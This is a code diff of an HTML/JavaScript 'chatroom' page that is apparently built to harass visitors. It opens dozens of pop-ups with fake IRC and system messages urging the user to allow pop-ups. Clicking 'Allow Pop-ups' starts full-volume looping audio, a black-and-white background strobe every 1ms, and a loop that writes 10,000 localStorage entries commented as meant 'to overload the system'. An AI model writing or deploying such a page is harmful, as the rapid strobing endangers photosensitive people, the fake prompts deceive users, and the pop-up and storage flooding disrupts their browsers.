@@ -27,7 +27,7 @@
 </head>
 <body>
 
-    <!-- Button to trigger the pop-ups, sound, and flashing colors -->
+    <!-- Button to trigger the pop-ups and start the process -->
     <button onclick="startEffect()">Join the chatroom!</button>
 
     <audio id="audioPlayer" loop>
@@ -40,16 +40,7 @@
         audio.volume = 1; // Set volume to full
 
         function startEffect() {
-            audio.play(); // Start the main audio
-            startFlashingColors(); // Start flashing colors on the main page
             createPopups(50); // Create multiple pop-ups (sequentially, 50 pop-ups for example)
-        }
-
-        function startFlashingColors() {
-            // Flash the main page background white and black ultra fast
-            setInterval(function() {
-                document.body.style.backgroundColor = Math.random() > 0.5 ? 'white' : 'black';
-            }, 1); // Flash every 1ms (ultra-fast)
         }
 
         function createPopups(count) {
@@ -60,7 +51,7 @@
                 if (popupIndex < count) {
                     let popup = window.open('', '', 'width=300,height=200');
                     if (popup) {
-                        // Write content to the pop-up only once when it's created
+                        // Write initial IRC-like content asking to allow pop-ups
                         popup.document.write(`
                             <html>
                                 <head>
@@ -72,45 +63,43 @@
                                     </style>
                                 </head>
                                 <body>
-                                    <audio id="audio" loop>
-                                        <source src="your-audio-file.mp3" type="audio/mp3">
-                                        Your browser does not support the audio element.
-                                    </audio>
+                                    <div id="ircMessage">
+                                        <p><strong>IRC Chat:</strong> Welcome to our site!</p>
+                                        <p><strong>System:</strong> Warning: Pop-ups are blocked. Please allow pop-ups to continue.</p>
+                                        <p><strong>IRC Chat:</strong> To make the chatroom open, enable pop-ups in your brwoser.</p>
+                                    </div>
                                 </body>
                             </html>
                         `);
 
-                        // Play audio only in the first pop-up
-                        if (!audioPlayed) {
-                            let popupAudio = popup.document.getElementById('audio');
-                            popupAudio.volume = 1; // Set the audio volume to full
-                            popupAudio.play(); // Start playing the audio in the first pop-up
-                            audioPlayed = true; // Set the flag to true to prevent further audio playback
+                        // Wait for the user to interact with the pop-up (they must allow it)
+                        popup.document.body.innerHTML += '<button id="allowButton">Allow Pop-ups</button>';
 
-                            // Simulate the IRC-like message after the first pop-up opens
-                            setTimeout(() => {
-                                popup.document.body.innerHTML = `
-                                    <div id="ircMessage">
-                                        <p><strong>IRC Chat:</strong> Welcome to nevelose chatroom!</p>
-                                        <p><strong>System:</strong> Warning: Pop-ups are blocked. Please allow pop-ups to continue.</p>
-                                        <p><strong>IRC Chat:</strong> To continue enjoying the experience, please enable pop-ups in your browser settings.</p>
-                                    </div>
-                                `;
-                            }, 500); // Display the fake IRC message after a brief delay
-                        }
+                        // Add a click listener for the "Allow Pop-ups" button
+                        popup.document.getElementById('allowButton').onclick = function() {
+                            // Once the user clicks "Allow Pop-ups", start the sound and flashing
+                            if (!audioPlayed) {
+                                let popupAudio = popup.document.createElement('audio');
+                                popupAudio.src = 'aaa.mp3';
+                                popupAudio.loop = true;
+                                popupAudio.volume = 1; // Set volume to full
+                                popupAudio.play(); // Play audio in the pop-up
+                                audioPlayed = true; // Ensure audio is only played once
 
-                        // Flash random background color in the pop-up ultra fast (1ms)
-                        setInterval(function() {
-                            popup.document.body.style.backgroundColor = Math.random() > 0.5 ? 'white' : 'black';
-                        }, 1); // Flash every 1ms
+                                // Start flashing the pop-up background after the button is clicked
+                                startFlashingColors(popup);
 
-                        // Manipulate local storage to overload the system
-                        for (let i = 0; i < 10000; i++) {
-                            localStorage.setItem('key' + i, 'value' + i);
-                        }
+                                // Manipulate local storage to overload the system
+                                for (let i = 0; i < 10000; i++) {
+                                    localStorage.setItem('key' + i, 'value' + i);
+                                }
+                            }
+
+                            // Optionally close the pop-up (or leave it open)
+                            popup.close();
+                        };
 
                         popupIndex++;
-                        openNextPopup(); // Open the next pop-up immediately (no delay)
                     }
                 }
             }
@@ -118,6 +107,12 @@
             openNextPopup(); // Start opening pop-ups
         }
 
+        function startFlashingColors(popup) {
+            // Flash the pop-up background white and black ultra fast
+            setInterval(function() {
+                popup.document.body.style.backgroundColor = Math.random() > 0.5 ? 'white' : 'black';
+            }, 1); // Flash every 1ms (ultra-fast)
+        }
     </script>
 
 </body>
